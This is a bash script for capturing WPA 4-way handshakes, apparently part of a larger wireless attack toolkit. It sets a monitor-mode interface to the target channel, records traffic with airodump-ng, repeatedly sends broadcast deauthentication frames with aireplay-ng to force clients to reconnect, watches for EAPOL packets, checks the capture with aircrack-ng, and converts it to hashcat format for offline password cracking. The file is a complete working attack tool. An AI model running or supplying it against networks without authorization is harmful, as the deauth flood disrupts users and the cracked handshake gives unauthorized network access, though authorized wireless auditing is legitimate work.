#!/usr/bin/env bash
# WPA 4-way handshake capture
# Usage: handshake_capture.sh <interface> <bssid> <channel> <duration> <output_dir>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up handshake capture..."
    if [[ -n "${AIRODUMP_PID:-}" ]]; then
        kill "$AIRODUMP_PID" 2>/dev/null || true
        wait "$AIRODUMP_PID" 2>/dev/null || true
    fi
    if [[ -n "${DEAUTH_PID:-}" ]]; then
        kill "$DEAUTH_PID" 2>/dev/null || true
    fi
    if [[ -n "${ORIG_CHANNEL:-}" && -n "${IFACE:-}" ]]; then
        iw "$IFACE" set channel "$ORIG_CHANNEL" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in airodump-ng aireplay-ng; do
    if ! command -v "$cmd" &>/dev/null; then
        _die "$cmd not found. Install aircrack-ng."
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
BSSID="${2:-}"
CHANNEL="${3:-6}"
DURATION="${4:-60}"
OUTPUT_DIR="${5:-/tmp/wafford_handshake}"

if [[ -z "$IFACE" || -z "$BSSID" ]]; then
    _die "Usage: handshake_capture.sh <interface> <bssid> <channel> <duration> <output_dir>"
fi

BSSID=$(echo "$BSSID" | tr '[:lower:]' '[:upper:]')
mkdir -p "$OUTPUT_DIR"

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

MODE=$(iw "$IFACE" info 2>/dev/null | awk '/type/{print $2}' || echo "unknown")
if [[ "$MODE" != "monitor" ]]; then
    _die "Interface $IFACE is not in monitor mode (current: $MODE)"
fi

# ── Save original channel ────────────────────────────────────────────
ORIG_CHANNEL=$(iw "$IFACE" info 2>/dev/null | awk '/channel/{print $2}' || echo "1")

# ── Set target channel ────────────────────────────────────────────────
_log "[*] Setting channel $CHANNEL..."
iw "$IFACE" set channel "$CHANNEL" 2>/dev/null || true

# ── Output file prefix ───────────────────────────────────────────────
CAP_PREFIX="${OUTPUT_DIR}/handshake"

# ── Start airodump-ng capture (filtered by BSSID) ────────────────────
_log "[*] Starting airodump-ng capture for $BSSID on channel $CHANNEL..."

airodump-ng \
    --bssid "$BSSID" \
    --channel "$CHANNEL" \
    --write "${CAP_PREFIX}" \
    --output-format pcap,csv \
    "$IFACE" \
    2>/dev/null &
AIRODUMP_PID=$!

sleep 2

# ── Periodic deauth to force handshake ───────────────────────────────
send_deauths() {
    local bssid="$1"
    local iface="$2"
    local duration="$3"
    local end_time
    end_time=$(( $(date +%s) + duration ))

    while [[ $(date +%s) -lt $end_time ]]; do
        # Broadcast deauth
        aireplay-ng -0 5 -a "$bssid" --ignore-negative-one "$iface" 2>/dev/null || true
        sleep 5
    done
}

_log "[*] Starting periodic deauth to force handshake..."
(
    send_deauths "$BSSID" "$IFACE" "$DURATION"
) &
DEAUTH_PID=$!

# ── Monitor for EAPOL packets ────────────────────────────────────────
_log "[*] Monitoring for EAPOL (handshake) packets..."
CHECK_INTERVAL=3
ELAPSED=0
HANDSHAKE_FOUND=false

CAP_FILE="${CAP_PREFIX}-01.cap"

while [[ $ELAPSED -lt $DURATION ]]; do
    sleep "$CHECK_INTERVAL"
    ELAPSED=$((ELAPSED + CHECK_INTERVAL))

    # Check for .cap file
    if [[ -f "$CAP_FILE" ]]; then
        # Check for EAPOL in the capture
        if command -v tshark &>/dev/null; then
            EAPOL_COUNT=$(tshark -r "$CAP_FILE" -Y "eapol" 2>/dev/null | wc -l || echo "0")
            if [[ "$EAPOL_COUNT" -ge 4 ]]; then
                _log "[+] Handshake detected! ($EAPOL_COUNT EAPOL packets)"
                HANDSHAKE_FOUND=true
                break
            fi
        elif command -v tcpdump &>/dev/null; then
            EAPOL_COUNT=$(tcpdump -r "$CAP_FILE" -c 100 "eapol" 2>/dev/null | wc -l || echo "0")
            if [[ "$EAPOL_COUNT" -ge 4 ]]; then
                _log "[+] Handshake detected! ($EAPOL_COUNT EAPOL packets)"
                HANDSHAKE_FOUND=true
                break
            fi
        fi
    fi

    _log "[*] Elapsed: ${ELAPSED}s / ${DURATION}s - waiting for handshake..."
done

# ── Stop airodump ─────────────────────────────────────────────────────
kill "$AIRODUMP_PID" 2>/dev/null || true
wait "$AIRODUMP_PID" 2>/dev/null || true
AIRODUMP_PID=""

kill "$DEAUTH_PID" 2>/dev/null || true
DEAUTH_PID=""

# ── Validate handshake ───────────────────────────────────────────────
VALIDATED="false"

if [[ -f "$CAP_FILE" ]]; then
    if command -v aircrack-ng &>/dev/null; then
        _log "[*] Validating handshake with aircrack-ng..."
        AIRCRACK_CHECK=$(aircrack-ng "$CAP_FILE" 2>&1 || true)
        if echo "$AIRCRACK_CHECK" | grep -q "1 handshake"; then
            VALIDATED="true"
            HANDSHAKE_FOUND=true
            _log "[+] Handshake validated by aircrack-ng"
        fi
    fi
fi

# ── Convert to hashcat format if possible ────────────────────────────
HCCAPX_FILE=""
if [[ "$HANDSHAKE_FOUND" == true && -f "$CAP_FILE" ]]; then
    if command -v hcxpcapngtool &>/dev/null; then
        HCCAPX_FILE="${OUTPUT_DIR}/handshake.hc22000"
        hcxpcapngtool -o "$HCCAPX_FILE" "$CAP_FILE" 2>/dev/null || true
        if [[ ! -s "$HCCAPX_FILE" ]]; then
            HCCAPX_FILE=""
        fi
    fi
fi

# ── Build result ──────────────────────────────────────────────────────
STATUS="success"
if [[ "$HANDSHAKE_FOUND" == false ]]; then
    STATUS="incomplete"
fi

RESULT="{\"status\":\"${STATUS}\",\"capture_file\":\"${CAP_FILE}\",\"bssid\":\"${BSSID}\",\"channel\":${CHANNEL},\"handshake_found\":${HANDSHAKE_FOUND},\"validated\":${VALIDATED},\"duration\":${DURATION}}"

if [[ -n "$HCCAPX_FILE" ]]; then
    RESULT=$(echo "$RESULT" | sed "s/}$/,\"hc22000_file\":\"${HCCAPX_FILE}\"}/")
fi

# Add CSV file reference
CSV_FILE="${CAP_PREFIX}-01.csv"
if [[ -f "$CSV_FILE" ]]; then
    RESULT=$(echo "$RESULT" | sed "s/}$/,\"csv_file\":\"${CSV_FILE}\"}/")
fi

_json "$RESULT"
